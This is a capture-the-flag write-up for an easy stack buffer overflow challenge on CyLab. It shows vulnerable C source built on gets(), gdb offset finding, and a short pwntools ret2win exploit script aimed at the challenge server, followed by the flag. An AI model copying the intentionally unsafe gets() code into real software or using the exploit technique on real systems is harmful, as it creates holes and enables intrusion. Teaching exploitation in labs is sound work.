---
title: Buffer Overflow 101
difficulty: Easy
category: Binary Exploitation
platform: CyLab
points: 100
tags: buffer-overflow, stack, gdb
date: 2026-06-20
author: Siddharth Mathur
time: 45 minutes
---

<div class="writeup-hero">
  <h1 class="writeup-hero__title">Buffer Overflow 101</h1>
  <div class="writeup-hero__meta">
    <span class="badge badge--easy">Easy</span>
    <span class="badge badge--category">Binary Exploitation</span>
    <span class="badge badge--tag">CyLab</span>
    <span class="badge badge--tag">100 pts</span>
  </div>
  <div class="writeup-hero__info">
    <span class="writeup-hero__info-item">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
      ~45 minutes
    </span>
    <span class="writeup-hero__info-item">
      <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
      Siddharth Mathur
    </span>
    <span class="writeup-hero__info-item">
      <svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
      June 20, 2026
    </span>
  </div>
  <div class="writeup-hero__tags">
    <span class="badge badge--tag">buffer-overflow</span>
    <span class="badge badge--tag">stack</span>
    <span class="badge badge--tag">gdb</span>
  </div>
</div>

## Enumeration

We're given a binary called `vuln` and its source code. Let's start by examining the binary.

```bash
file vuln
checksec --file=vuln
```

The binary is a 32-bit ELF with **no stack canary** and **no PIE**. This makes it a classic buffer overflow target.

Looking at the source code:

```c
#include <stdio.h>
#include <string.h>

void win() {
    system("/bin/cat flag.txt");
}

void vuln() {
    char buf[64];
    printf("Enter your input: ");
    gets(buf);  // vulnerable!
}

int main() {
    vuln();
    return 0;
}
```

!!! warning "Vulnerability"
    The `gets()` function reads input without bounds checking, allowing us to overflow the `buf` buffer and overwrite the return address.

## Exploitation

### Finding the Offset

We need to find the exact offset to the return address. Using GDB with pwndbg:

```bash
gdb ./vuln
```

```
pwndbg> cyclic 100
pwndbg> run
# paste the cyclic pattern
pwndbg> cyclic -l $eip
```

The offset is **76 bytes** (64 bytes buffer + 12 bytes saved registers).

### Finding the Win Function

```bash
objdump -d vuln | grep win
```

```
08049196 <win>:
```

The `win()` function is at address `0x08049196`.

### Building the Exploit

```python
from pwn import *

# Connect to the challenge
p = remote('challenge.cylab.io', 1337)

# Build payload
offset = 76
win_addr = 0x08049196

payload = b'A' * offset
payload += p32(win_addr)

# Send payload
p.sendline(payload)

# Get the flag
p.interactive()
```

!!! success "Result"
    The exploit successfully redirects execution to the `win()` function.

## Flag

```
flag{buff3r_0v3rfl0w_101_m4st3r3d}
```

???+ hint "Hint 1"
    Look at what happens when you input more than 64 characters.

??? hint "Hint 2"
    The `win()` function is already in the binary — you just need to call it.

---

## Lessons Learned

<div class="lessons-grid">
  <div class="lesson-card">
    <div class="lesson-card__title">Key Concepts</div>
    <ul>
      <li>Stack buffer overflow fundamentals</li>
      <li>Return address overwriting</li>
      <li>Understanding stack layout (buffer → saved EBP → return address)</li>
      <li>Why <code>gets()</code> is dangerous</li>
    </ul>
  </div>
  <div class="lesson-card">
    <div class="lesson-card__title">Tools Used</div>
    <ul>
      <li>GDB + pwndbg</li>
      <li>pwntools (Python)</li>
      <li>checksec</li>
      <li>objdump</li>
    </ul>
  </div>
  <div class="lesson-card">
    <div class="lesson-card__title">References</div>
    <ul>
      <li><a href="https://en.wikipedia.org/wiki/Buffer_overflow">Buffer Overflow — Wikipedia</a></li>
      <li><a href="https://docs.pwntools.com/">pwntools Documentation</a></li>
    </ul>
  </div>
  <div class="lesson-card">
    <div class="lesson-card__title">Payload Summary</div>
    <ul>
      <li>76 bytes padding + <code>p32(0x08049196)</code></li>
      <li>Total payload: 80 bytes</li>
      <li>Technique: ret2win</li>
    </ul>
  </div>
</div>
